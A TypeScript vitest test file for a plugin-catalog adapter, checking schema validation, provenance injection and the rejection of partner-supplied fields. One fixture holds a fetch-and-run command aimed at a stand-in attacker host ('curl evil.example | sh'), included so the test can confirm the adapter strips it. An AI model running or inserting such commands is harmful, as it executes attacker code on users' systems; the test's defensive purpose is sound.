/**
 * Phase 2 M2.6 DSH 1024Store adapter tests.
 *
 * The partner wire shape is fictional here (the real shape is pinned by
 * integration fixture in M2.6 follow-up). The tests verify the contract
 * rules:
 * - never treats an `install` / command string from the provider as input
 * - never bypasses schema / provenance / network checks
 * - injects Host provenance
 */
import { describe, expect, it } from 'vitest'
import { Dsh1024StoreAdapter } from '../../../src/host/adapters/dsh-1024store.js'
import { RestrictedHttpClient } from '../../../src/host/http-client.js'
import type { RestrictedHttpClientHooks } from '../../../src/host/http-client.js'
import type { CatalogSourceManifest } from '../../../src/contracts/types.js'
import catalogSourceExample from '../../../docs/examples/catalog-source.example.json'

const manifest: CatalogSourceManifest = catalogSourceExample as unknown as CatalogSourceManifest

const publicResolve: RestrictedHttpClientHooks['resolveImpl'] = async () => [
  { address: '93.184.216.34', family: 4 },
]

function makeAdapter(fetchImpl: typeof fetch): Dsh1024StoreAdapter {
  const client = new RestrictedHttpClient({
    fetchImpl,
    resolveImpl: publicResolve,
    budgets: { totalMs: 5_000 },
  })
  return new Dsh1024StoreAdapter(client, 'https://deepseek1024.com/api/v1/registry', 'org.dsh.1024store')
}

const partnerResponse = {
  schemaVersion: '1.0.0',
  generatedAt: '2026-08-17T08:00:00Z',
  revision: '2026-08-17',
  items: [
    {
      id: 'better-sidebar',
      name: 'dsh-plugin-better-sidebar',
      displayName: 'Better Sidebar',
      summary: 'A 1024Store sidebar plugin',
      latestVersion: '1.2.0',
      categories: ['interface'],
      repository: { url: 'https://github.com/example/dsh-plugin-better-sidebar' },
      npm: { name: 'dsh-plugin-better-sidebar' },
    },
  ],
  page: { nextCursor: 'p2', total: 12 },
}

const fetchContext = {
  signal: new AbortController().signal,
  sourceRecordId: '00000000-0000-0000-0000-000000000000',
  manifest,
}

describe('Dsh1024StoreAdapter', () => {
  it('translates partner items into the standard snapshot shape', async () => {
    const fetchImpl: typeof fetch = (async () => new Response(JSON.stringify(partnerResponse), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    })) as typeof fetch
    const adapter = makeAdapter(fetchImpl)
    const snapshot = await adapter.fetch({}, fetchContext)
    expect(snapshot.source.adapterId).toBe('market.dsh-1024store-v1')
    expect(snapshot.source.providerId).toBe('org.dsh.1024store')
    expect(snapshot.source.registrationKind).toBe('built-in')
    expect(snapshot.items[0]?.id).toBe('better-sidebar')
    expect(snapshot.items[0]?.provenance.itemId).toBe('better-sidebar')
    expect(snapshot.items[0]?.provenance.providerId).toBe('org.dsh.1024store')
    expect(snapshot.items[0]?.repository?.url).toBe('https://github.com/example/dsh-plugin-better-sidebar')
    expect(snapshot.items[0]?.package?.name).toBe('dsh-plugin-better-sidebar')
  })

  it('rejects items that lack npm identity (schema anyOf {repository, package})', async () => {
    const noIdentity = {
      ...partnerResponse,
      items: [
        {
          id: 'noidentity',
          name: 'noidentity',
          displayName: 'No identity',
          summary: 'no summary',
        },
      ],
    }
    const fetchImpl: typeof fetch = (async () => new Response(JSON.stringify(noIdentity), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    })) as typeof fetch
    const adapter = makeAdapter(fetchImpl)
    await expect(adapter.fetch({}, fetchContext)).rejects.toThrow(/schema validation/)
  })

  it('rejects malformed partner responses with reason "schema"', async () => {
    const fetchImpl: typeof fetch = (async () => new Response(JSON.stringify({ items: 'not-array' }), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    })) as typeof fetch
    const adapter = makeAdapter(fetchImpl)
    await expect(adapter.fetch({}, fetchContext)).rejects.toThrow()
  })

  it('never trusts a partner install command even if one is present', async () => {
    const smuggled = {
      ...partnerResponse,
      items: [
        {
          ...partnerResponse.items[0],
          // the partner returns an executable field — adapter must NOT consume it
          install: 'pnpm add malicious',
          installCommand: 'curl evil.example | sh',
        },
      ],
    }
    const fetchImpl: typeof fetch = (async () => new Response(JSON.stringify(smuggled), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    })) as typeof fetch
    const adapter = makeAdapter(fetchImpl)
    const snapshot = await adapter.fetch({}, fetchContext)
    const item = snapshot.items[0] as unknown as Record<string, unknown>
    // The partner install fields are not in the partner's documented shape,
    // so they're stripped by the local translation. If the partner does
    // somehow leak them, the schema validation that follows injection
    // rejects the snapshot (additionalProperties: false on item).
    expect(item['install']).toBeUndefined()
    expect(item['installCommand']).toBeUndefined()
  })
})